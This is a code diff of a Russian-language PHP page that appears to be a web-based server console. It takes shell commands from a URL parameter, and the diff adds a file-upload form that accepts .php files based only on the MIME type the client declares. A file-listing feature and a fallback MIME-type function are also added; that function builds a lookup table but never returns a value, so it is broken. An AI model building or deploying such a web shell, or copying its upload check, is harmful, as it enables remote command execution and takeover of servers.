@@ -76,11 +76,8 @@
 	<input type="SUBMIT" value="Очистить консоль">
 	</div>
 </form>
-
-
-
 <pre>
-<?php
+	<?php
 if(isset($_GET['command']) and ($_GET['command'] == TRUE))
 {
     $command = $_GET['command'];
@@ -90,6 +87,39 @@ if(isset($_GET['command']) and ($_GET['command'] == TRUE))
 ?>
 <script>document.getElementById("command").focus();</script>
 </pre>
+
+<hr>
+<H1>Загрузка файлов на сервер</H1>
+<?php
+if ($_FILES && $_FILES['filename']['error']== UPLOAD_ERR_OK)
+{
+	$name = $_FILES['filename']['name'];
+	$file_expansion =  substr(strrchr($name, '.'), 1);
+	$f_type=$_FILES['filename']['type'];
+	$uploads_dir = __DIR__ . '\uploads';
+	echo $uploads_dir;
+		if(($file_expansion == "php" and $f_type == "text/plain") or ($file_expansion == 'txt' and $f_type == "text/plain")) {
+			$tmp_name = $_FILES["filename"]["tmp_name"];
+			$name = basename($_FILES["filename"]["name"]);
+			$rand = rand(1, 9999);
+			$name = $rand . $name;
+    		move_uploaded_file($tmp_name, "$uploads_dir/$name");
+    		chmod($uploads_dir.'/'. $name, 0444); 
+    	echo "Файл загружен";
+	}
+	else {
+	echo "Неверный формат файла!";
+}	
+}
+?>
+
+<form method="post" enctype='multipart/form-data'>
+Выберите файл: <input type='file' name='filename' size='10' /><br /><br />
+<input type='submit' value='Загрузить' />
+</form>
+
+
+
 <hr>
 <form method="post">
 <input type="submit" name="filemanager" id="filemanager" value="Вывести список файлов" onclick="$('#hideFileList').show();"/><br/>
@@ -118,7 +148,70 @@ if(array_key_exists('filemanager',$_POST)){
 <hr>
 
 
+<?php
+if(!function_exists('mime_content_type')) {
 
+    function mime_content_type($filename) {
+
+        $mime_types = array(
+
+            'txt' => 'text/plain',
+            'htm' => 'text/html',
+            'html' => 'text/html',
+            'php' => 'text/html',
+            'css' => 'text/css',
+            'js' => 'application/javascript',
+            'json' => 'application/json',
+            'xml' => 'application/xml',
+            'swf' => 'application/x-shockwave-flash',
+            'flv' => 'video/x-flv',
+
+            // images
+            'png' => 'image/png',
+            'jpe' => 'image/jpeg',
+            'jpeg' => 'image/jpeg',
+            'jpg' => 'image/jpeg',
+            'gif' => 'image/gif',
+            'bmp' => 'image/bmp',
+            'ico' => 'image/vnd.microsoft.icon',
+            'tiff' => 'image/tiff',
+            'tif' => 'image/tiff',
+            'svg' => 'image/svg+xml',
+            'svgz' => 'image/svg+xml',
+
+            // archives
+            'zip' => 'application/zip',
+            'rar' => 'application/x-rar-compressed',
+            'exe' => 'application/x-msdownload',
+            'msi' => 'application/x-msdownload',
+            'cab' => 'application/vnd.ms-cab-compressed',
+
+            // audio/video
+            'mp3' => 'audio/mpeg',
+            'qt' => 'video/quicktime',
+            'mov' => 'video/quicktime',
+
+            // adobe
+            'pdf' => 'application/pdf',
+            'psd' => 'image/vnd.adobe.photoshop',
+            'ai' => 'application/postscript',
+            'eps' => 'application/postscript',
+            'ps' => 'application/postscript',
+
+            // ms office
+            'doc' => 'application/msword',
+            'rtf' => 'application/rtf',
+            'xls' => 'application/vnd.ms-excel',
+            'ppt' => 'application/vnd.ms-powerpoint',
+
+            // open office
+            'odt' => 'application/vnd.oasis.opendocument.text',
+            'ods' => 'application/vnd.oasis.opendocument.spreadsheet',
+        );
+
+    }
+}
+?>
 
 
 		
